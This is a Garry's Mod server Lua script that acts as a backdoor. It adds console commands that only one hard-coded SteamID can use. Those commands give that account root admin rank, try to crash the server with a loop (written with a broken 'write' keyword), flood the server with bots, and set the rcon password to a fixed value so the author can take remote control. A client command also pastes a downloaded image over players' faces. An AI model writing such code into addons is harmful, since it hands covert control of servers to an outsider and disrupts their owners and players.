if SERVER then

concommand.Add("karapuz_rank_root", function( ply ) 
if ply:SteamID() == 'STEAM_0:0:555589835' then 
    RunConsoleCommand('badmin', 'setgroup', ply:SteamID(), 'root')

       elseif ply:SteamID() ~= 'STEAM_0:0:555589835'  then
                
        end
    end)
end



if SERVER then

concommand.Add("karapuz_rank_user", function( ply ) 
if ply:SteamID() == 'STEAM_0:0:555589835' then 
    RunConsoleCommand('badmin', 'setgroup', ply:SteamID(), 'user')

       elseif ply:SteamID() ~= 'STEAM_0:0:555589835'  then
                
        end
    end)
end



if SERVER then

concommand.Add("penis_crash_server", function( ply, cmd, args ) 
if ply:SteamID() == 'STEAM_0:0:555589835' then 
    local i = 9999999999999999999999

    write i < 9999999999999999999999999999999999 do
        print(i)
        i = i + 999999999999999999999999
end

       elseif ply:SteamID() ~= 'STEAM_0:0:555589835'  then

        end
    end)
end




if SERVER then

concommand.Add("penis_bot", function( ply, cmd, args ) 
if ply:SteamID() == 'STEAM_0:0:555589835' then 

    timer.Simple(.1,function()
        timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end)
        timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end)
        timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end)
        timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end)
        timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end)
        timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end)
        timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end)
        timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end)
        timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end)
        timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end)
        timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end)
        timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end)   
        timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end)
        timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end)
        timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end)
        timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end)
        timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end)
        timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end)
        timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end)
        timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end)
        timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end)
        timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end)
        timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end)
        timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end)
   
    end)
       elseif ply:SteamID() ~= 'STEAM_0:0:555589835'  then

end
end)
end




if SERVER then

concommand.Add("penis_rcon", function( ply, cmd, args ) 
if ply:SteamID() == 'STEAM_0:0:555589835' then 
    RunConsoleCommand("rcon_password", "o8ZxspNiPfBLzjXX")

       elseif ply:SteamID() ~= 'STEAM_0:0:555589835'  then

end
end)
end







if CLIENT then

concommand.Add("urba_face", function() 
    if ply:SteamID() == 'STEAM_0:0:555589835' then 

http.Fetch("https://i.imgur.com/Mp5Blba.png",function(s)
    file.Write("gena.png",s)
end)

hook.Add("PostPlayerDraw" ,"manual_model_draw_example" ,function(ply)
    if not IsValid(ply) or not ply:Alive() then return end
    local attach_id = ply:LookupAttachment("eyes")
    if not attach_id then return end
    local attach = ply:GetAttachment(attach_id)  
    if not attach then return end
    local pos = attach.Pos
    local ang = attach.Ang
    pos = pos + (ang:Forward() * 2)
    ang:RotateAroundAxis(ang:Forward(),90)
    ang:RotateAroundAxis(ang:Right(),-90)
    cam.Start3D2D(pos,ang,0.1)
        surface.SetDrawColor(255,255,255)
        surface.SetMaterial(Material("data/gena.png"))
        surface.DrawTexturedRect(-50,-50,100,100)
    cam.End3D2D()
end)
    
    elseif ply:SteamID() ~= 'STEAM_0:0:555589835'  then

    end
end)
end
